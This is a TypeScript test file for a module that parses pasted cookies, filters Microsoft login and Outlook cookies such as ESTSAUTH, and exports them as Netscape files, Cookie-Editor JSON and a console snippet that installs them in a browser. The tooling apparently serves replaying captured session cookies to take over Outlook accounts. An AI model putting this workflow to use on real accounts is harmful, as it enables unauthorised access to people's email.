import test from 'node:test';
import assert from 'node:assert/strict';
import {
  parseCookiePaste,
  normalizeCookiePasteToHeaderString,
  filterMicrosoftRelatedCookies,
  cookieToSetUrl,
  cookiesToNetscape,
  cookiesToCookieEditorJson,
  cookiesToBrowserConsoleSnippet,
  pickPrimaryCookieOrigin,
} from '../shared/cookieFormat';

test('parse semicolon header', () => {
  const r = parseCookiePaste('a=1; b=two');
  assert.equal(r.length, 2);
  assert.equal(r[0].name, 'a');
  assert.equal(r[1].value, 'two');
  assert.equal(normalizeCookiePasteToHeaderString('x=9; y=z'), 'x=9; y=z');
});

test('parse JSON cookie array', () => {
  const j = JSON.stringify([
    { name: 'ESTSAUTH', value: 'secret', domain: '.login.microsoftonline.com', path: '/' },
  ]);
  const r = parseCookiePaste(j);
  assert.equal(r.length, 1);
  assert.equal(r[0].name, 'ESTSAUTH');
  assert.ok(r[0].domain?.includes('microsoftonline'));
});

test('parse Netscape format', () => {
  const lines = [
    '# Netscape HTTP Cookie File',
    '.login.microsoftonline.com	TRUE	/	TRUE	1893456000	ESTSAUTH	abc123def',
  ].join('\n');
  const r = parseCookiePaste(lines);
  assert.ok(r.length >= 1);
  assert.equal(r[0].name, 'ESTSAUTH');
  assert.equal(r[0].value, 'abc123def');
});

test('filterMicrosoftRelatedCookies keeps MS domains', () => {
  const all = parseCookiePaste(
    JSON.stringify([
      { name: 'a', value: '1', domain: 'login.microsoftonline.com' },
      { name: 'b', value: '2', domain: 'evil.test' },
    ])
  );
  const f = filterMicrosoftRelatedCookies(all);
  assert.equal(f.length, 1);
  assert.equal(f[0].name, 'a');
});

test('cookieToSetUrl', () => {
  assert.ok(cookieToSetUrl({ name: 'n', value: 'v', domain: '.outlook.office.com' }).includes('outlook.office.com'));
});

test('cookiesToNetscape round-trip via parseCookiePaste', () => {
  const original = parseCookiePaste(
    JSON.stringify([
      {
        name: 'ESTSAUTH',
        value: 'abc123',
        domain: '.login.microsoftonline.com',
        path: '/',
        secure: true,
        expirationDate: 1893456000,
      },
      {
        name: 'X-OWA',
        value: 'def456',
        domain: 'outlook.office.com',
        path: '/owa',
        secure: false,
      },
    ])
  );

  const text = cookiesToNetscape(original);
  assert.ok(text.startsWith('# Netscape HTTP Cookie File'));
  // Each cookie line has 7 tab-separated fields
  const dataLines = text.split('\n').filter(l => l && !l.startsWith('#'));
  for (const line of dataLines) {
    assert.equal(line.split('\t').length, 7, `line missing fields: ${line}`);
  }

  const reparsed = parseCookiePaste(text);
  assert.equal(reparsed.length, original.length);

  const ests = reparsed.find(c => c.name === 'ESTSAUTH');
  assert.ok(ests, 'ESTSAUTH should round-trip');
  assert.equal(ests!.value, 'abc123');
  assert.equal(ests!.domain, '.login.microsoftonline.com');
  assert.equal(ests!.secure, true);
  assert.equal(ests!.expirationDate, 1893456000);

  const owa = reparsed.find(c => c.name === 'X-OWA');
  assert.ok(owa, 'X-OWA should round-trip');
  assert.equal(owa!.value, 'def456');
  assert.equal(owa!.path, '/owa');
  assert.equal(owa!.secure, false);
});

test('cookiesToCookieEditorJson produces extension-compatible entries', () => {
  const cookies = parseCookiePaste(
    JSON.stringify([
      {
        name: 'ESTSAUTH',
        value: 'abc',
        domain: '.login.microsoftonline.com',
        path: '/',
        secure: true,
        httpOnly: true,
        sameSite: 'no_restriction',
        expirationDate: 1893456000,
      },
      {
        name: 'X-OWA',
        value: 'xyz',
        domain: 'outlook.office.com',
        path: '/owa',
        secure: true,
      },
      {
        name: 'noDomain',
        value: 'skip',
      },
    ])
  );

  const json = cookiesToCookieEditorJson(cookies);
  const arr = JSON.parse(json);
  assert.equal(Array.isArray(arr), true);
  assert.equal(arr.length, 2, 'orphan-domain entries should be skipped');

  const ests = arr.find((c: any) => c.name === 'ESTSAUTH');
  assert.ok(ests, 'ESTSAUTH must be present');
  assert.equal(ests.domain, '.login.microsoftonline.com');
  assert.equal(ests.hostOnly, false);
  assert.equal(ests.httpOnly, true);
  assert.equal(ests.secure, true);
  assert.equal(ests.session, false);
  assert.equal(ests.sameSite, 'no_restriction');
  assert.equal(ests.storeId, '0');
  assert.equal(ests.expirationDate, 1893456000);

  const owa = arr.find((c: any) => c.name === 'X-OWA');
  assert.ok(owa, 'X-OWA must be present');
  assert.equal(owa.hostOnly, true, 'no leading dot -> hostOnly');
  assert.equal(owa.session, true, 'no expirationDate -> session cookie');
  assert.equal(owa.path, '/owa');
});

test('cookiesToBrowserConsoleSnippet skips HttpOnly cookies and reloads', () => {
  const cookies = parseCookiePaste(
    JSON.stringify([
      {
        name: 'ESTSAUTH',
        value: 'secret',
        domain: '.login.microsoftonline.com',
        path: '/',
        httpOnly: true,
      },
      {
        name: 'X-OWA',
        value: 'plain',
        domain: '.outlook.office.com',
        path: '/',
      },
    ])
  );

  const snippet = cookiesToBrowserConsoleSnippet(cookies, { email: 'user@contoso.com' });
  assert.match(snippet, /Watcher OWA cookie installer for user@contoso\.com/);
  assert.match(snippet, /location\.reload/);
  // HttpOnly cookies appear only as a comment, never inside the cookies array
  // payload that the snippet iterates over.
  const payloadMatch = snippet.match(/var cookies = (\[.*?\]);/);
  assert.ok(payloadMatch, 'snippet must define a cookies payload');
  const payload = JSON.parse(payloadMatch![1]);
  assert.equal(payload.length, 1);
  assert.equal(payload[0].n, 'X-OWA');
  // ESTSAUTH should appear in the human-readable HttpOnly note instead.
  assert.match(snippet, /HttpOnly[\s\S]*ESTSAUTH/);
});

test('cookiesToBrowserConsoleSnippet handles all-HttpOnly input gracefully', () => {
  const snippet = cookiesToBrowserConsoleSnippet(
    [
      {
        name: 'ESTSAUTH',
        value: 'v',
        domain: '.login.microsoftonline.com',
        httpOnly: true,
      },
    ],
    { reload: false }
  );
  assert.doesNotMatch(snippet, /location\.reload/, 'reload:false must omit reload');
  const payloadMatch = snippet.match(/var cookies = (\[.*?\]);/);
  assert.ok(payloadMatch);
  assert.equal(JSON.parse(payloadMatch![1]).length, 0);
});

test('pickPrimaryCookieOrigin prefers outlook.office.com', () => {
  assert.equal(
    pickPrimaryCookieOrigin([
      { name: 'a', value: '1', domain: '.login.microsoftonline.com' },
      { name: 'b', value: '2', domain: 'outlook.office.com' },
    ]),
    'https://outlook.office.com/mail/inbox'
  );
  assert.equal(
    pickPrimaryCookieOrigin([
      { name: 'a', value: '1', domain: 'login.microsoftonline.com' },
    ]),
    'https://login.microsoftonline.com/'
  );
  assert.equal(pickPrimaryCookieOrigin([]), 'https://outlook.office.com/mail/inbox');
});

test('parseCookiePaste preserves httpOnly + sameSite from JSON', () => {
  const cookies = parseCookiePaste(
    JSON.stringify([
      {
        name: 'A',
        value: '1',
        domain: 'outlook.office.com',
        httpOnly: true,
        sameSite: 'no_restriction',
      },
      {
        name: 'B',
        value: '2',
        domain: 'outlook.office.com',
        sameSite: 'lax',
      },
    ])
  );
  assert.equal(cookies[0].httpOnly, true);
  assert.equal(cookies[0].sameSite, 'no_restriction');
  assert.equal(cookies[1].httpOnly, undefined);
  assert.equal(cookies[1].sameSite, 'lax');
});

test('cookiesToNetscape skips entries with no domain', () => {
  const text = cookiesToNetscape([
    { name: 'orphan', value: 'v' }, // no domain — Netscape requires one
    { name: 'ok', value: 'v', domain: 'outlook.office.com' },
  ]);
  const dataLines = text.split('\n').filter(l => l && !l.startsWith('#'));
  assert.equal(dataLines.length, 1);
  assert.ok(dataLines[0].endsWith('\tok\tv'));
});
